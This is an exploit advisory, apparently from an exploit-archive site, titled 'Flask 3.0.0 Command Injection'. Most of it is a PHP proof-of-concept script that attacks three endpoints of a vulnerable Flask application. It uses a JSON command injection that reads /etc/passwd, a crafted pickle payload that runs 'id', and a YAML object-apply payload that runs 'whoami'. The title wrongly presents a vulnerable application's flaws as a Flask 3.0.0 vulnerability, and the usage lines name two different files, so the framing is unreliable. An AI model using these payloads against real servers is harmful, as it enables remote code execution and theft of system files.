@@ -1,0 +1,75 @@
+=============================================================================================================================================
+| # Title     : Flask 3.0.0 Command Injection                                                                                               |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 145.0.2 (64 bits)                                                            |
+| # Vendor    : https://palletsprojects.com/p/flask/                                                                                        |
+=============================================================================================================================================
+
+[+] References : https://packetstorm.news/files/id/212501/ 
+
+[+] Summary :  The vulnerable Flask application exposes three attack surfaces:
+
+                1. /api/run     – Command Injection via JSON
+                2. /api/load    – Unsafe pickle deserialization
+                3. /api/yaml    – YAML unsafe loading leading to execution
+
+This PHP PoC triggers all three vectors. 
+
+[+]  Usage :   * : Save as: poc.php
+                   Run    : php scan.php
+
+[+]  POC :	
+
+<?php
+// PoC for Flask 3.0.0
+// by Indoushka
+
+$target = "http://vulnerable-host:5000";
+
+//----------------------------------------------------
+// Helper: Send HTTP POST
+//----------------------------------------------------
+function post($url, $data, $is_json = false) {
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $url);
+    if ($is_json) {
+        curl_setopt($ch, CURLOPT_HTTPHEADER, array("Content-Type: application/json"));
+        $data = json_encode($data);
+    }
+    curl_setopt($ch, CURLOPT_POST, true);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    $res = curl_exec($ch);
+    curl_close($ch);
+    return $res;
+}
+
+//----------------------------------------------------
+// 1. Command Injection
+//----------------------------------------------------
+echo "=== Command Injection (cat /etc/passwd) ===\n";
+$res = post("$target/api/run", ["cmd"=>"cat /etc/passwd"], true);
+echo "$res\n\n";
+
+//----------------------------------------------------
+// 2. Pickle RCE (Payload encoded in PHP)
+//----------------------------------------------------
+echo "=== Pickle RCE (id) ===\n";
+$pickle_payload = "\x80\x05cposix\nsystem\nq\x00X\x02\x00\x00\x00idq\x01\x85q\x02.";
+$res = post("$target/api/load", $pickle_payload, false);
+echo "HTTP Status or Response:\n";
+var_dump($res);
+echo "\n";
+
+//----------------------------------------------------
+// 3. YAML RCE
+//----------------------------------------------------
+echo "=== YAML RCE (whoami) ===\n";
+$yaml_payload = "!!python/object/apply:subprocess.Popen\n- [\"sh\", \"-c\", \"whoami\"]";
+$res = post("$target/api/yaml", $yaml_payload, false);
+echo "$res\n\n";
+?>
+
+Greetings to :=====================================================================================
+jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
+===================================================================================================
